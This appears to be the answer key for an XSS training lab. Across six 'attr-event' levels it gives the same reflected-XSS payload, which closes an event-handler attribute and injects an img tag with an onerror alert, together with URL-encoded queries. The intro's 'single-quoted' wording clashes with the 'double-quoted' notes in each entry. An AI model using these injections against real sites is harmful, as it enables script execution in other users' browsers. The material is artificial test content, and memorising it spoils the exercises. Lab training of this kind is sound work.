# attr-event — solutions

Reflections inside single-quoted JS strings within inline event handlers; close the string and inject JS.

### attr-event-level1

`/attr-event/level1/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: double-quoted handler calling undefined show('…'), so a JS-string breakout throws first; close the attribute and tag instead

### attr-event-level2

`/attr-event/level2/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: double-quoted handler calling undefined validate('…'), so a JS-string breakout throws first; close the attribute and tag instead

### attr-event-level3

`/attr-event/level3/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: double-quoted handler calling undefined init('…'), so a JS-string breakout throws first; close the attribute and tag instead

### attr-event-level4

`/attr-event/level4/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: double-quoted handler calling undefined report('…'), so a JS-string breakout throws first; close the attribute and tag instead

### attr-event-level5

`/attr-event/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: double-quoted handler calling undefined save('…'), so a JS-string breakout throws first; close the attribute and tag instead

### attr-event-level6

`/attr-event/level6/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: double-quoted handler calling undefined action('…'), so a JS-string breakout throws first; close the attribute and tag instead
